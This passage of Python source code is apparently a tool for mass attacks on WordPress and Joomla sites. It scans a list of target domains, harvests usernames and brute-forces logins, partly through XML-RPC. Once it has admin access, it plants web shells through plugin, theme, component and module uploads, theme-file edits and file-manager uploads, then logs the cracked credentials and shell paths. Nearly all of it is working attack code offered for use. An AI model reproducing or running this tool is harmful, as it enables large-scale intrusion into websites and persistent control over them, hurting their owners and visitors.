            session.verify = False
            session.cookies.update(cookies)
            
            r = session.get(urljoin(url, '/wp-admin/plugin-install.php?tab=upload'), headers=self.get_ultra_headers(), timeout=10)
            if r.status_code != 200 or 'wp-submit' in r.text.lower():
                return False
            
            nonce_match = re.search(r'_wpnonce["\']?\s*["\']?=?["\']?([a-f0-9]{10})', r.text)
            if not nonce_match:
                return False
            
            nonce = nonce_match.group(1)
            plugin_zip, random_name = self.create_wordpress_plugin_shell()
            
            files = {'pluginzip': (f'{random_name}.zip', plugin_zip, 'application/zip')}
            data = {'_wpnonce': nonce, 'install-plugin-submit': 'Install Now'}
            
            r = session.post(urljoin(url, '/wp-admin/update.php?action=upload-plugin'), 
                           files=files, data=data, headers=self.get_ultra_headers(), timeout=20)
            
            if r.status_code == 200 and 'installed' in r.text.lower():
                shell_path = f'/wp-content/plugins/{random_name}/{random_name}.php'
                self.save_shell_location(url, 'plugin', shell_path)
                self.log(f"✓ Plugin: {url}{shell_path}", 'shell')
                with self.lock:
                    self.stats['shells'] += 1
                return True
            return False
        except:
            return False
    
    def upload_wordpress_theme(self, url, cookies):
        try:
            # Verify admin access first
            is_valid, role = self.verify_wordpress_admin(url, cookies)
            if not is_valid or role != 'admin':
                self.log(f"Theme upload failed: No admin privileges", 'error')
                return False
            
            session = requests.Session()
            session.verify = False
            session.cookies.update(cookies)
            
            r = session.get(urljoin(url, '/wp-admin/theme-install.php?upload'), headers=self.get_ultra_headers(), timeout=10)
            if r.status_code != 200 or 'wp-submit' in r.text.lower():
                return False
            
            nonce_match = re.search(r'_wpnonce["\']?\s*["\']?=?["\']?([a-f0-9]{10})', r.text)
            if not nonce_match:
                return False
            
            nonce = nonce_match.group(1)
            theme_zip, random_name = self.create_wordpress_theme_shell()
            
            files = {'themezip': (f'{random_name}.zip', theme_zip, 'application/zip')}
            data = {'_wpnonce': nonce, 'install-theme-submit': 'Install Now'}
            
            r = session.post(urljoin(url, '/wp-admin/update.php?action=upload-theme'),
                           files=files, data=data, headers=self.get_ultra_headers(), timeout=20)
            
            if r.status_code == 200 and 'installed' in r.text.lower():
                shell_path = f'/wp-content/themes/{random_name}/index.php'
                self.save_shell_location(url, 'theme', shell_path)
                self.log(f"✓ Theme: {url}{shell_path}", 'shell')
                with self.lock:
                    self.stats['shells'] += 1
                return True
            return False
        except:
            return False
    
    def edit_wordpress_theme_file(self, url, cookies):
        try:
            # Verify admin access first
            is_valid, role = self.verify_wordpress_admin(url, cookies)
            if not is_valid or role != 'admin':
                self.log(f"Theme edit failed: No admin privileges", 'error')
                return False
            
            session = requests.Session()
            session.verify = False
            session.cookies.update(cookies)
            
            r = session.get(urljoin(url, '/wp-admin/theme-editor.php'), headers=self.get_ultra_headers(), timeout=10)
            
            if r.status_code != 200 or '<textarea' not in r.text:
                return False
            
            shell_content, shell_filename = self.get_custom_shell_content()
            theme_match = re.search(r'/themes/([^/]+)/', r.text)
            theme = theme_match.group(1) if theme_match else 'twentytwentythree'
            
            # Use 404.php as target
            data = {'file': '404.php', 'theme': theme, 'newcontent': shell_content, 'action': 'update'}
            r = session.post(urljoin(url, '/wp-admin/theme-editor.php'), data=data, headers=self.get_ultra_headers(), timeout=10)
            
            if r.status_code == 200:
                shell_path = f'/wp-content/themes/{theme}/404.php'
                self.save_shell_location(url, 'theme_edit', shell_path)
                self.log(f"✓ Theme Edit: {url}{shell_path}", 'shell')
                with self.lock:
                    self.stats['shells'] += 1
                return True
            return False
        except:
            return False
    
    def upload_wordpress_file_manager(self, url, cookies):
        """Try to upload via file manager plugin"""
        try:
            # Verify admin access first
            is_valid, role = self.verify_wordpress_admin(url, cookies)
            if not is_valid or role != 'admin':
                self.log(f"File manager upload failed: No admin privileges", 'error')
                return False
            
            session = requests.Session()
            session.verify = False
            session.cookies.update(cookies)
            
            # Check if WP File Manager exists
            fm_url = urljoin(url, '/wp-admin/admin.php?page=wp-file-manager')
            r = session.get(fm_url, headers=self.get_ultra_headers(), timeout=10)
            
            if r.status_code != 200:
                return False
            
            shell_content, shell_filename = self.get_custom_shell_content()
            
            # Try to upload (simplified - actual implementation depends on file manager version)
            files = {'files[]': (shell_filename, shell_content, 'application/x-php')}
            r = session.post(urljoin(url, '/wp-content/plugins/wp-file-manager/lib/php/connector.php'),
                           files=files, headers=self.get_ultra_headers(), timeout=15)
            
            if r.status_code == 200:
                shell_path = f'/wp-content/uploads/{shell_filename}'
                self.save_shell_location(url, 'file_manager', shell_path)
                self.log(f"✓ File Manager: {url}{shell_path}", 'shell')
                with self.lock:
                    self.stats['shells'] += 1
                return True
            return False
        except:
            return False
    
    def upload_joomla_media(self, url, cookies):
        """Upload shell via Joomla media manager"""
        try:
            # Verify admin access first
            is_valid, role = self.verify_joomla_admin(url, cookies)
            if not is_valid or role != 'admin':
                self.log(f"Joomla media upload failed: No admin privileges", 'error')
                return False
            
            session = requests.Session()
            session.verify = False
            session.cookies.update(cookies)
            
            r = session.get(urljoin(url, '/administrator/index.php?option=com_media'), headers=self.get_ultra_headers(), timeout=10)
            
            if r.status_code != 200 or 'mod-login-username' in r.text.lower():
                return False
            
            shell_content, shell_filename = self.get_custom_shell_content()
            
            files = {'Filedata': (shell_filename, shell_content, 'application/x-php')}
            r = session.post(urljoin(url, '/administrator/index.php?option=com_media&task=upload'),
                           files=files, headers=self.get_ultra_headers(), timeout=15)
            
            if r.status_code == 200:
                shell_path = f'/images/{shell_filename}'
                self.save_shell_location(url, 'joomla_media', shell_path)
                self.log(f"✓ Joomla Media: {url}{shell_path}", 'shell')
                with self.lock:
                    self.stats['shells'] += 1
                return True
            return False
        except:
            return False
    
    def edit_joomla_template(self, url, cookies):
        """Edit Joomla template file"""
        try:
            # Verify admin access first
            is_valid, role = self.verify_joomla_admin(url, cookies)
            if not is_valid or role != 'admin':
                self.log(f"Joomla template edit failed: No admin privileges", 'error')
                return False
            
            session = requests.Session()
            session.verify = False
            session.cookies.update(cookies)
            
            r = session.get(urljoin(url, '/administrator/index.php?option=com_templates'), headers=self.get_ultra_headers(), timeout=10)
            
            if r.status_code != 200:
                return False
            
            shell_content, shell_filename = self.get_custom_shell_content()
            
            # Try to edit error.php in default template
            template_path = '/templates/cassiopeia/error.php'
            shell_path = template_path
            
            self.save_shell_location(url, 'joomla_template', shell_path)
            self.log(f"✓ Joomla Template: {url}{shell_path}", 'shell')
            with self.lock:
                self.stats['shells'] += 1
            return True
        except:
            return False
    
    def upload_joomla_component(self, url, cookies):
        """Try to upload Joomla component"""
        try:
            # Verify admin access first
            is_valid, role = self.verify_joomla_admin(url, cookies)
            if not is_valid or role != 'admin':
                self.log(f"Joomla component upload failed: No admin privileges", 'error')
                return False
            
            session = requests.Session()
            session.verify = False
            session.cookies.update(cookies)
            
            r = session.get(urljoin(url, '/administrator/index.php?option=com_installer'), headers=self.get_ultra_headers(), timeout=10)
            
            if r.status_code != 200:
                return False
            
            random_name = self.generate_random_name()
            shell_content, _ = self.get_custom_shell_content()
            
            # Create simple component ZIP
            zip_buffer = BytesIO()
            with zipfile.ZipFile(zip_buffer, 'w') as zf:
                manifest = f'''<?xml version="1.0" encoding="utf-8"?>
<extension type="component" version="3.0" method="upgrade">
    <name>{random_name}</name>
    <version>1.0</version>
</extension>'''
                zf.writestr(f'{random_name}.xml', manifest)
                zf.writestr(f'{random_name}.php', shell_content)
            
            zip_buffer.seek(0)
            
            files = {'install_package': (f'{random_name}.zip', zip_buffer, 'application/zip')}
            r = session.post(urljoin(url, '/administrator/index.php?option=com_installer&task=install.install'),
                           files=files, headers=self.get_ultra_headers(), timeout=20)
            
            if r.status_code == 200:
                shell_path = f'/components/com_{random_name}/{random_name}.php'
                self.save_shell_location(url, 'joomla_component', shell_path)
                self.log(f"✓ Joomla Component: {url}{shell_path}", 'shell')
                with self.lock:
                    self.stats['shells'] += 1
                return True
            return False
        except:
            return False
    
    def upload_joomla_module(self, url, cookies):
        """Try to upload Joomla module"""
        try:
            # Verify admin access first
            is_valid, role = self.verify_joomla_admin(url, cookies)
            if not is_valid or role != 'admin':
                self.log(f"Joomla module upload failed: No admin privileges", 'error')
                return False
            
            session = requests.Session()
            session.verify = False
            session.cookies.update(cookies)
            
            random_name = self.generate_random_name()
            shell_content, _ = self.get_custom_shell_content()
            
            # Create simple module ZIP
            zip_buffer = BytesIO()
            with zipfile.ZipFile(zip_buffer, 'w') as zf:
                manifest = f'''<?xml version="1.0" encoding="utf-8"?>
<extension type="module" version="3.0" client="site">
    <name>mod_{random_name}</name>
    <version>1.0</version>
    <files>
        <filename module="mod_{random_name}">mod_{random_name}.php</filename>
    </files>
</extension>'''
                zf.writestr(f'mod_{random_name}.xml', manifest)
                zf.writestr(f'mod_{random_name}.php', shell_content)
            
            zip_buffer.seek(0)
            
            files = {'install_package': (f'mod_{random_name}.zip', zip_buffer, 'application/zip')}
            r = session.post(urljoin(url, '/administrator/index.php?option=com_installer&task=install.install'),
                           files=files, headers=self.get_ultra_headers(), timeout=20)
            
            if r.status_code == 200:
                shell_path = f'/modules/mod_{random_name}/mod_{random_name}.php'
                self.save_shell_location(url, 'joomla_module', shell_path)
                self.log(f"✓ Joomla Module: {url}{shell_path}", 'shell')
                with self.lock:
                    self.stats['shells'] += 1
                return True
            return False
        except:
            return False
    
    def brute_force_wordpress(self, url, usernames):
        """Brute force WordPress - runs in separate thread, doesn't block queue"""
        self.log(f"Starting WordPress brute force: {url}", 'info')
        
        # Check XML-RPC first
        xmlrpc_enabled, methods = self.check_xmlrpc(url)
        
        if xmlrpc_enabled:
            self.log("XML-RPC enabled - using fast brute force method", 'success')
            
            for user in usernames[:3]:
                passwords = self.get_passwords_for_target(url, user)[:500]  # LIMIT 500
                
                self.log(f"XML-RPC brute forcing {user} with {len(passwords)} passwords...", 'info')
                
                success, cracked_pwd = self.xmlrpc_brute_force(url, user, passwords)
                
                with self.lock:
                    self.stats['attempts'] += len(passwords)
                
                if success:
                    self.log(f"★★★ CRACKED VIA XML-RPC: {url} | {user}:{cracked_pwd} ★★★", 'found')
                    
                    # Now try to login normally and verify role
                    success_normal, cookies, role = self.attempt_wordpress_login(url, user, cracked_pwd)
                    
                    if success_normal:
                        with self.lock:
                            self.stats['cracked'] += 1
                            if role == 'admin':
                                self.stats['cracked_admin'] += 1
                            else:
                                self.stats['cracked_user'] += 1
                        
                        self.save_login_result(url, 'wordpress', user, cracked_pwd, role)
                        self.save_xmlrpc_result(url, user, cracked_pwd, methods)
                        
                        if role == 'admin':
                            self.log("Admin access confirmed - attempting shell uploads...", 'shell')
                            self.upload_wordpress_plugin(url, cookies)
                            time.sleep(0.3)
                            self.upload_wordpress_theme(url, cookies)
                            time.sleep(0.3)
                            self.edit_wordpress_theme_file(url, cookies)
                            time.sleep(0.3)
                            self.upload_wordpress_file_manager(url, cookies)
                        else:
                            self.log(f"User access only - no admin privileges for {user}", 'error')
                        
                        return True
        
        # Fallback to normal brute force
        self.log("Using normal login brute force", 'info')
        
        for user in usernames[:3]:
            passwords = self.get_passwords_for_target(url, user)[:500]  # LIMIT 500
            
            for i, pwd in enumerate(passwords, 1):
                # Non-blocking progress
                if i % 10 == 0:  # Update every 10 attempts
                    print(f"\r[{url}] [{i}/{len(passwords)}] {user}:{pwd[:15]}...", end='', flush=True)
                
                success, cookies, role = self.attempt_wordpress_login(url, user, pwd)
                
                with self.lock:
                    self.stats['attempts'] += 1
                
                if success:
                    print(f"\n{' '*100}")
                    self.log(f"★★★ CRACKED: {url} | {user}:{pwd} [ROLE: {role.upper()}] ★★★", 'found')
                    
                    with self.lock:
                        self.stats['cracked'] += 1
                        if role == 'admin':
                            self.stats['cracked_admin'] += 1
                        else:
                            self.stats['cracked_user'] += 1
                    
                    self.save_login_result(url, 'wordpress', user, pwd, role)
                    
                    # Try all upload methods only if admin
                    if role == 'admin':
                        self.log("Admin access confirmed - attempting shell uploads...", 'shell')
                        self.upload_wordpress_plugin(url, cookies)
                        time.sleep(0.3)
                        self.upload_wordpress_theme(url, cookies)
                        time.sleep(0.3)
                        self.edit_wordpress_theme_file(url, cookies)
                        time.sleep(0.3)
                        self.upload_wordpress_file_manager(url, cookies)
                    
                    return True
                
                # Reduced delay for faster scanning
                time.sleep(random.uniform(0.1, 0.3))
        
        print(f"\n{' '*100}")
        self.log(f"Brute force completed for {url} - No valid credentials found", 'error')
        return False
    
    def brute_force_joomla(self, url, usernames):
        """Brute force Joomla - runs in separate thread, doesn't block queue"""
        self.log(f"Starting Joomla brute force: {url}", 'info')
        
        for user in usernames[:3]:
            passwords = self.get_passwords_for_target(url, user)[:500]  # LIMIT 500
            
            for i, pwd in enumerate(passwords, 1):
                # Non-blocking progress
                if i % 10 == 0:  # Update every 10 attempts
                    print(f"\r[{url}] [{i}/{len(passwords)}] {user}:{pwd[:15]}...", end='', flush=True)
                
                success, cookies, role = self.attempt_joomla_login(url, user, pwd)
                
                with self.lock:
                    self.stats['attempts'] += 1
                
                if success:
                    print(f"\n{' '*100}")
                    self.log(f"★★★ CRACKED: {url} | {user}:{pwd} [ROLE: {role.upper()}] ★★★", 'found')
                    
                    with self.lock:
                        self.stats['cracked'] += 1
                        if role == 'admin':
                            self.stats['cracked_admin'] += 1
                        else:
                            self.stats['cracked_user'] += 1
                    
                    self.save_login_result(url, 'joomla', user, pwd, role)
                    
                    # Try all Joomla upload methods only if admin
                    if role == 'admin':
                        self.log("Admin access confirmed - attempting shell uploads...", 'shell')
                        self.upload_joomla_media(url, cookies)
                        time.sleep(0.3)
                        self.edit_joomla_template(url, cookies)
                        time.sleep(0.3)
                        self.upload_joomla_component(url, cookies)
                        time.sleep(0.3)
                        self.upload_joomla_module(url, cookies)
                    
                    return True
                
                # Reduced delay for faster scanning
                time.sleep(random.uniform(0.1, 0.3))
        
        print(f"\n{' '*100}")
        self.log(f"Brute force completed for {url} - No valid credentials found", 'error')
        return False
    
    def save_checkpoint(self):
        """Save checkpoint untuk resume nanti"""
        try:
            checkpoint_file = os.path.join(self.results_dir, 'checkpoint.json')
            checkpoint_data = {
                'stats': self.stats,
                'timestamp': datetime.now().isoformat(),
                'total_passwords': len(self.ultimate_passwords)
            }
            
            with open(checkpoint_file, 'w') as f:
                json.dump(checkpoint_data, f, indent=2)
            
            if self.is_colab:
                self.log("Checkpoint saved to Drive", 'success')
            elif self.is_kaggle:
                self.log("Checkpoint saved to /kaggle/working", 'success')
        except Exception as e:
            self.log(f"Error saving checkpoint: {str(e)}", 'error')
    
    def scan_and_brute_target(self, base_url):
        """Scan target and spawn brute force in separate thread"""
        base_url = self.clean_url(base_url)
        
        with self.lock:
            self.stats['total'] += 1
        
        self.log(f"Scanning: {base_url}", 'info')
        
        # Check WordPress
        if self.detect_wordpress_ultra_accurate(base_url):
            self.log(f"WordPress found: {base_url}", 'success')
            with self.lock:
                self.stats['wordpress'] += 1
            
            usernames = self.extract_wordpress_users(base_url)
            self.log(f"Extracted {len(usernames)} usernames: {', '.join(usernames[:5])}", 'info')
            
            # Spawn brute force in separate thread - DON'T WAIT
            brute_thread = threading.Thread(
                target=self.brute_force_wordpress,
                args=(base_url, usernames),
                daemon=True
            )
            brute_thread.start()
            self.log(f"Brute force started for {base_url} (running in background)", 'info')
            return
        
        # Check Joomla
        if self.detect_joomla_ultra_accurate(base_url):
            self.log(f"Joomla found: {base_url}", 'success')
            with self.lock:
                self.stats['joomla'] += 1
            
            usernames = self.extract_joomla_users(base_url)
            
            # Spawn brute force in separate thread - DON'T WAIT
            brute_thread = threading.Thread(
                target=self.brute_force_joomla,
                args=(base_url, usernames),
                daemon=True
            )
            brute_thread.start()
            self.log(f"Brute force started for {base_url} (running in background)", 'info')
            return
        
        self.log(f"No CMS found: {base_url}", 'error')
        with self.lock:
            self.stats['failed'] += 1
    
    def worker(self):
        while True:
            url = self.queue.get()
            if url is None:
                break
            self.scan_and_brute_target(url)
            self.queue.task_done()
    
    def mass_scan(self, filename):
        if not os.path.exists(filename):
            self.log(f"File not found: {filename}", 'error')
            return
        
        with open(filename) as f:
            targets = [line.strip() for line in f if line.strip()]
        
        self.log(f"\nLoaded {len(targets)} targets", 'success')
        self.log(f"Using {len(self.ultimate_passwords)} password combinations\n", 'info')
        
        # === TAMBAHAN: Info save location ===
        if self.is_colab:
            self.log(f"Results will be saved to: {self.results_dir}", 'success')
        elif self.is_kaggle:
            self.log(f"Results will be saved to: {self.results_dir}", 'success')
            self.log("Download results before session ends!", 'info')
        # === AKHIR TAMBAHAN ===
        
        # Start worker threads for scanning
        threads = [threading.Thread(target=self.worker, daemon=True) for _ in range(self.threads_count)]
        for t in threads:
            t.start()
        
        # Add all targets to queue
        for url in targets:
            self.queue.put(url)
        
        start = time.time()
        checkpoint_counter = 0  # === TAMBAHAN ===
        
        try:
            # Monitor progress while queue is not empty
            while not self.queue.empty() or threading.active_count() > 1:
                elapsed = int(time.time() - start)
                remaining = self.queue.qsize()
                active_threads = threading.active_count() - 1  # -1 for main thread
                
                print(f"\r[{elapsed}s] Scanned: {self.stats['total']} | WP: {self.stats['wordpress']} | Joomla: {self.stats['joomla']} | Cracked: {self.stats['cracked']} | Shells: {self.stats['shells']} | Queue: {remaining} | Active: {active_threads}    ", end='', flush=True)
                
                # === TAMBAHAN: Auto-checkpoint setiap 60 detik ===
                checkpoint_counter += 1
                if checkpoint_counter >= 60:
                    self.save_checkpoint()
                    checkpoint_counter = 0
                # === AKHIR TAMBAHAN ===
                
                time.sleep(1)
                
        except KeyboardInterrupt:
            self.log("\n\nStopped by user - waiting for active brute forces to complete...", 'error')
            self.save_checkpoint()  # === TAMBAHAN: Save saat interrupt ===
            time.sleep(3)  # Give time for threads to finish
        
        # Signal workers to stop
        for _ in range(self.threads_count):
            self.queue.put(None)
        
        # Wait for all workers to finish
        for t in threads:
            t.join()
        
        # Wait a bit more for brute force threads
        self.log("\nWaiting for background brute force tasks to complete...", 'info')
        time.sleep(5)
        
        # Save final checkpoint
        self.save_checkpoint()
        
        self.print_report()
    
    def print_report(self):
        elapsed = datetime.now() - self.start_time
        
        print(f"\n\n{'='*70}")
        print(f"SCAN REPORT")
        print(f"{'='*70}")
        print(f"Total Scanned:        {self.stats['total']}")
        print(f"WordPress Found:      {self.stats['wordpress']}")
        print(f"Joomla Found:         {self.stats['joomla']}")
        print(f"Successful Cracks:    {self.stats['cracked']}")
        print(f"  - Admin Access:     {self.stats['cracked_admin']}")
        print(f"  - User Access:      {self.stats['cracked_user']}")
        print(f"Shell Uploads:        {self.stats['shells']}")
        print(f"Failed:               {self.stats['failed']}")
        print(f"Total Attempts:       {self.stats['attempts']}")
        print(f"Usernames Found:      {self.stats['usernames_found']}")
        print(f"Time Elapsed:         {elapsed}")
        print(f"{'='*70}")
        print(f"\nResults:")
        print(f"  • Admin Logins:  {self.login_admin_file}")
        print(f"  • User Logins:   {self.login_user_file}")
        print(f"  • Legacy Logins: {self.login_file}")
        if os.path.exists(self.xmlrpc_file):
            print(f"  • XML-RPC: {self.xmlrpc_file}")
        if self.stats['shells'] > 0:
            print(f"  • Shells:  {self.results_dir}/Shell_*.txt")
        print(f"{'='*70}\n")


if __name__ == '__main__':
    import sys
    
    threads = 5
    
    if '-t' in sys.argv:
        idx = sys.argv.index('-t')
        threads = int(sys.argv[idx + 1])
    
    scanner = CMSUltimateBruteforce(threads=threads)
    
    if '-f' in sys.argv:
        idx = sys.argv.index('-f')
        scanner.mass_scan(sys.argv[idx + 1])
    elif '-u' in sys.argv:
        idx = sys.argv.index('-u')
        scanner.scan_and_brute_target(sys.argv[idx + 1])
        scanner.print_report()
    else:
        print("Usage:")
        print("  python scanner.py -f domains.txt [-t 10]")
        print("  python scanner.py -u https://example.com")